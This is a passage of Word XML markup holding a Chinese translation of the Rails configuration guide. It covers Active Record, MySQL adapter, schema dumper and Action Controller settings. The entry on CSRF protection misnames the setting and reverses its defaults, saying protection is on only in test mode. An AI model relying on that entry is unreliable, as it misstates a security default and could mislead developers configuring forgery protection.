        <w:t xml:space="preserve"> 控制所有迁移脚本 (migrations) 的命名中是否带有序列或者时间戳. 如果有多个开发者开发同一个应用程序，建议使用默认的时间戳.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F76067F" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="168"/>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config.active_record.lock_optimistically</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制 Active Record 是否使用乐观锁， 默认是使用的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE408B6" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="169"/>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config.active_record.whitelist_attributes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会创建一个空白的白名单，这个名单包含了在批量赋值 (mass assignment) 防护下可进行批量赋值的模型属性，并对应用程序里所有模型有效。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002EE80A" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="170"/>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config.active_record.auto_explain_threshold_in_seconds</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置自动执行(sql指令)</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的临界值。所有逼近临界值的查询会把它们的查询计划进行日志记录。在开发模式下默认是 0.5。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22888AC5" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17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config.active_record.dependent_restrict_raises</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 当某个具有 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:dependent =&gt; :restrict</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 关联关系的对象被删除时，控制该行为。设置为false将会阻止抛出</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>DeleteRestrictionError</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>异常,并且会将错误信息添加入到模型对象里。在开发模式下默认为flase.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4077D0" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17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config.active_record.mass_assignment_sanitizer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会判断 Rails 中对批量赋值(mass assignment)清理的严格程度。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:strict</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 在这个模式下，调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>update_attributes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并对任何不是</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attr_accessible</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">的属性进行批量赋值的话，将会抛出一个异常。如果设置这个选项为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的话，只会将某个属性被赋值时的异常信息打印到日志文件，并不抛出异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23416365"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MySQL 适配器的一个附加配置选项：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8EE4D9" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17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ActiveRecord::ConnectionAdapters::MysqlAdapter.emulate_booleans</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制活动日志(Active Record)是否会将MySQL数据库中 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>tinyint(1)</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 栏当作布尔值，默认是true.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEE136C"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结构导出器(Schema Dumper)的一个附加配置选项：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6C1816" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="174"/>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ActiveRecord::SchemaDumper.ignore_tables</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一组表，任何产生的(数据库)结构(schema)文件都_不_会包含这些表。如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.active_record.schema_format == :ruby</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, 那么这个设置会被忽略.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE4D597"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3.7 配置 Action Controller</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E2D446"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config.action_controller</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 包括了这些配置设置：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F67A24" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17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config.action_controller.asset_host</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置资源主机。当CDNs被用于资源主机而不是应用程序自己处理资源时很有用.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB88287" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17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config.action_controller.asset_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个代码块，这个代码块配置在哪里可以找到资源文件。更简短的版本是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.asset_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="137471E0" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17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config.action_controller.page_cache_directory</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是 web 服务器的文档的根目录，使用</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Base.page_cache_directory = “/document/root”</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">的值.在 Rails 中，这个目录已经被设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.public_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (它的值通常设置为</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.root + “/public”</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)。改变这个值对防止</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>里的文件名冲突很有用，但这么做需要配置你的 web 服务器从新的地方寻找缓存文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75416986" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="178"/>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config.action_controller.page_cache_extension</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置保存在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>page_cache_directory</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的缓存页面使用的扩展名。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697A40FF" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="179"/>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config.action_controller.perform_caching</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置应用程序是否进行缓存。开发模式默认关闭，在生产模式默认开启.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121C78A4" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="180"/>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config.action_controller.default_charset</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 规定所有渲染器的字符编码。默认是 “utf-8”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694CE4AC" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18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config.action_controller.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个符合 Log4r 或者 Ruby 默认日志类的接口的日志类，这个日志类用于记录来自 Action Controller 的信息。设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 则不进行记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45ED840F" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18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config.action_controller.request_forgery_protection_token</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 RequestForgery 设置令牌的参数名。调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>protect_from_forgery</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 默认将其设置为</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>authenticity_token</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F00AAA" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18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config.action_controller.allow_forgery_protection_token</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是否使用 CSRF 保护。默认在测试模式下使用，其它模式不使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD60614" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="184"/>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config.action_controller.relative_url_root</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 用于告诉 Rails 你要部署到某个子目录。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ENV['RAILS_RELATIVE_URL_ROOT']</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB423CE"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缓存代码的两个附加设置：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCE571A" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18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ActionController::Base.page_cache_directory</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置缓存页面的存放目录，这些页面是 Rails 为你的web服务器创建的。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.public_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">(通常设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.root + “/public”</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F03BF1" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
